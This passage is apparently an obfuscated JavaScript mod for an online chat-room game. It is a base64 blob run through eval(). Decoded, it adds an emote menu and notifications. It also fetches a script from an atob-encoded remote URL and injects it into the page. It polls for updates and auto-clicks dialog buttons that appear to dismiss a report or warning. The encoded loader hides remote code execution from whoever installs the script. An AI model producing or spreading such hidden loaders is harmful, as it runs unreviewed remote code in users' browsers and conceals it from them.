biA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA2MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDgwMDApOyB9IH0sCiAgeyBuYW1lOiAiU2xlZXAiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllcyIsICJDbG9zZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkV5ZXMyIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRW1vdGljb24iLCAiU2xlZXAiKTsKICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOyAgfSB9Cl07Cgpjb25zdCBidXR0b25Db250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLndpZHRoID0gIjMwMHB4IjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKY29uc3QgYnV0dG9uQ2lyY2xlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNpcmNsZS5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS53aWR0aCA9ICIyMDBweCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5oZWlnaHQgPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwpidXR0b25DaXJjbGUuc3R5bGUub3BhY2l0eSA9ICIxIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmxlZnQgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRvcCA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkIGJsYWNrIjsKCmJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b25DaXJjbGUpOwpjb25zdCBsb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CmxvZ28uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CmxvZ28uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpsb2dvLnN0eWxlLndpZHRoID0gIjgwcHgiOwpsb2dvLnN0eWxlLmhlaWdodCA9ICI4MHB4IjsKbG9nby5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKbG9nby5zdHlsZS5sZWZ0ID0gIjUwJSI7CmxvZ28uc3R5bGUudG9wID0gIjUwJSI7CmxvZ28uc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5hcHBlbmRDaGlsZChsb2dvKTsKY29uc3QgYnV0dG9ucyA9IFtdOwpmb3IgKGxldCBpID0gMDsgaSA8IGJ1dHRvbkRhdGEubGVuZ3RoOyBpKyspIHsKICBjb25zdCBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICBidXR0b24uaW5uZXJUZXh0ID0gYnV0dG9uRGF0YVtpXS5uYW1lOwogIGJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgYnV0dG9uLnN0eWxlLndpZHRoID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5oZWlnaHQgPSAiODBweCI7CiAgYnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogIGJ1dHRvbi5zdHlsZS5jb2xvciA9ICJ3aGl0ZSI7CiAgYnV0dG9uLnN0eWxlLmJveFNoYWRvdyA9ICIwIDJweCA1cHggcmdiYSgwLCAwLCAwLCAwLjMpIjsKICBidXR0b24uc3R5bGUubGVmdCA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS50b3AgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpYDsKICBidXR0b24uc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQsIHRyYW5zZm9ybSAwLjJzIGVhc2UtaW4tb3V0IjsKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBidXR0b25EYXRhW2ldLmFjdGlvbik7CiAgYnV0dG9uQ29udGFpbmVyLmFwcGVuZENoaWxkKGJ1dHRvbik7CiAgYnV0dG9ucy5wdXNoKGJ1dHRvbik7CgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTk5cHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEuMDUpYDsKICB9KTsKCiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCAoKSA9PiB7CiAgICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEpYDsKICB9KTsKfQoKCgpsZXQgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IHRydWU7Cn0gZWxzZSBpZiAoaXNHcmF2ZUtleURvd24gJiYgZXZlbnQua2V5ID09PSAiZSIpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgKGV2ZW50KSA9PiB7CmlmIChldmVudC5rZXkgPT09ICJgIikgewogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIChldmVudCkgPT4gewogIGlmICghYnV0dG9uQ29udGFpbmVyLmNvbnRhaW5zKGV2ZW50LnRhcmdldCkpIHsKICAgIGlmIChidXR0b25Db250YWluZXIucGFyZW50Tm9kZSA9PT0gZG9jdW1lbnQuYm9keSkgewogICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgICB9CiAgICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9Cn0pOwoKLy9FbmQgT2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX18KCi8vRU5EIE9GIENPTlRFWFQgTUVOVSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLy9CQ01FIExPR08gT24gQ2hhcmFjdGVyCmZldGNoKGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDBKRFRWTTNMMEpEVFM5dFlXbHVMMEpEVEM1cWN3PT0nKSkKLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQoudGhlbih0ZXh0ID0+IHsKY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5pbm5lckhUTUwgPSB0ZXh0Owpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7Cn0pCgoKZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgfQogIH0KICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwogICAgCnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICB9LCAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB9LCA1MDAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9LCA1NTAwKTsKICAgIHNlbmRGZGVidWcoKTsKCiAgfQogIAoKLy9UaGUgVXBkYXRlIHRvYXN0CmZ1bmN0aW9uIHNob3dUb2FzdFVwZGF0ZSgpIHsKdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChjbG9zZUJ1dHRvbik7CmNsb3NlQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9LCA1MDApOwp9KTsKdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CgovLyBVcGRhdGUgY2xpZW50IG1lc3NhZ2UKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJOZXcgdXBkYXRlIGRldGVjdGVkLCByZWZyZXNoIEJDIHRvIHVwZGF0ZSB0byBWMi4wLjciOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwp9LCAwKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKfSwgNTAwMDAwMCk7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0sIDU1MDAwMDApOwoKfQoKICAvLyBFbmQgb2YgVXBkYXRlIFRvYXN0X19fX19fX19fX19fX19fXwoKICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CgogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiBidXR0b24uY2xpY2soKSk7CiAgICAgIH0KICAgIH0KICB9LCAxKTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gewogICAgICAgICAgaWYgKGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkRvIG5vdCBzaG93IHRoaXMgcmVwb3J0IGFnYWluIHVubGVzcyBzb21ldGhpbmcgY2hhbmdlcyIgfHwgYnV0dG9uLnRleHRDb250ZW50ID09PSAiQ2xvc2UiKSB7CiAgICAgICAgICAgIGJ1dHRvbi5jbGljaygpOwogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICB9CiAgICB9CiAgfSwgNTAwKTsKCiAgLy8gIFVSTCBvZiB0aGUgdXBkYXRlIHBhZ2UKY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi91cGRhdGVtYW5hZ2VyLmpzJzsKY29uc3QgbWF4VmVyc2lvbiA9IDE1OwpsZXQgYWxlcnRUcmlnZ2VyZWQgPSBmYWxzZTsKZnVuY3Rpb24gY2hlY2tWZXJzaW9uKCkgewogIGZldGNoKHVybCkKICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKHZlcnNpb24gPT4gewogICAgICBpZiAocGFyc2VJbnQodmVyc2lvbikgPiBtYXhWZXJzaW9uICYmICFhbGVydFRyaWdnZXJlZCkgewogICAgICAgIHNob3dUb2FzdFVwZGF0ZSgpOwogICAgICAgIGFsZXJ0VHJpZ2dlcmVkID0gdHJ1ZTsKICAgICAgfQogICAgfSkKICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKGVycm9yKSk7Cn0KLy8gQ2hlY2sgZm9yIHVwZGF0ZXMgZXZlcnkgNSBzZWNvbmRzCnNldEludGVydmFsKGNoZWNrVmVyc2lvbiwgNTAwMCk7Cn0KfSkKCgo=')
if (sprc) {
eval(sprc);
}
/*
44
*/
